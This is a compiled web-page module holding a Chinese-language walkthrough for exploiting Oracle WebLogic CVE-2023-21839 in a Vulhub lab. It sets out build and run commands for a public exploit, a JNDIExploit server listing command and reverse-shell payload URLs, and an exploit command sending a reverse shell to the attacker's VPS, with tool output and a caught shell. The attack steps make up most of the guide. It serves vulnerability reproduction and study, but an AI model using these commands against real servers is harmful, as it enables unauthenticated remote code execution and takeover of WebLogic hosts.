import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as t,c as r,a as e,b as i,d as n,e as l}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),p=e("p",null,"Oracle WebLogic Server是业界领先的应用程序服务器，用于使用Java EE标准构建企业应用程序，并以低拥有成本将其部署在可靠、可扩展的运行时。",-1),u={href:"https://www.oracle.com/security-alerts/cpujan2023.html",target:"_blank",rel:"noopener noreferrer"},v=e("p",null,"CVE-2023-21839 允许远程用户在未经授权的情况下通过 IIOP/T3 进行 JNDI lookup 操作，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 RCE 漏洞。",-1),m=e("p",null,"参考链接:",-1),g={href:"https://www.oracle.com/security-alerts/cpujan2023.html",target:"_blank",rel:"noopener noreferrer"},b=l(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Oracle WebLogic Server 12.2.1.3.0
Oracle WebLogic Server 12.2.1.4.0
Oracle WebLogic Server 14.1.1.0.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行以下命令启动 Weblogic server 12.2.1.3</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动完成后访问<code>http://your-vps-ip:7001/console</code>可以看到管理界面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230228142512212.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,8),h={href:"https://github.com/4ra1n/CVE-2023-21839",target:"_blank",rel:"noopener noreferrer"},_=e("p",null,"需要使用 JDK 8u191 以下启动 Weblogic 并自行搭建 JNDI Server，此处使用 ：",-1),x={href:"https://github.com/WhiteHSBG/JNDIExploit",target:"_blank",rel:"noopener noreferrer"},f=e("li",null,[e("strong",null,"java version：1.8.0_361")],-1),E=l(`<p>如果发现 panic 或有其他报错，说明目标不存在漏洞（或关闭了 IIOP 功能）。</p><p>Linux/Mac OS：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cd cmd
go build -o CVE-2023-21839
./CVE-2023-21839 -ip 127.0.0.1 -port 7001 -ldap ldap://127.0.0.1:1389/evil
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Windows：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cd cmd
go build -o CVE-2023-21839.exe
CVE-2023-21839.exe -ip 127.0.0.1 -port 7001 -ldap ldap://127.0.0.1:1389/evil
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在Windows上的DNS Log：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>C:\\Threekiii&gt; CVE-2023-21839.exe -ip &lt;your-vps-ip&gt; -port 7001 -ldap ldap://9xqmx0.dnslog.cn
[*] your-ip: &lt;your-vps-ip&gt;
[*] your-port: 7001
[*] your-ldap: ldap://9xqmx0.dnslog.cn
[*] weblogic 12
[*] id=2 LocateRequest
[*] id=3 RebindRequest
[*] id=4 RebindRequest
[*] id=5 LocateRequest
[*] id=6 ResolveRequest
[*] id=7 ResolveRequest
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230228145744308.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>Windows上测试反弹Shell不成功，转到Linux系统执行。</p><p>启动JNDI服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar JNDIExploit-1.4-SNAPSHOT.jar -i &lt;your-vps-ip&gt;

------------
[+] Basic Queries: ldap://&lt;your-vps-ip&gt;:1389/Basic/[PayloadType]/[Params], e.g.
    ldap://&lt;your-vps-ip&gt;:1389/Basic/Dnslog/[domain]
    ldap://&lt;your-vps-ip&gt;:1389/Basic/Command/id
    ldap://&lt;your-vps-ip&gt;:1389/Basic/Command/Base64/[base64_encoded_cmd]
    ldap://&lt;your-vps-ip&gt;:1389/Basic/ReverseShell/&lt;your-vps-ip&gt;/9999  ---windows NOT supported
    ...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行Exploit：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>./CVE-2023-21839 -ip &lt;your-vps-ip&gt; -port 7001 -ldap ldap://&lt;your-vps-ip&gt;:1389/Basic/ReverseShell/&lt;your-vps-ip&gt;/9999
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>监听9999端口，成功接收反弹Shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230228154614995.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15);function y(w,C){const a=d("ExternalLinkIcon");return t(),r("div",null,[c,p,e("p",null,[i("在 "),e("a",u,[i("Oracle 2023年1月安全公告日"),n(a)]),i(" 修复了这个漏洞。")]),v,m,e("ul",null,[e("li",null,[e("a",g,[i("https://www.oracle.com/security-alerts/cpujan2023.html"),n(a)])])]),b,e("p",null,[i("Weblogic CVE-2023-21839 RCE Exploit： "),e("a",h,[i("https://github.com/4ra1n/CVE-2023-21839"),n(a)])]),_,e("ul",null,[e("li",null,[i("JNDIExploit："),e("a",x,[i("https://github.com/WhiteHSBG/JNDIExploit"),n(a)])]),f]),E])}const V=s(o,[["render",y],["__file","Weblogic 未授权远程代码执行漏洞 CVE-2023-21839.html.vue"]]);export{V as default};
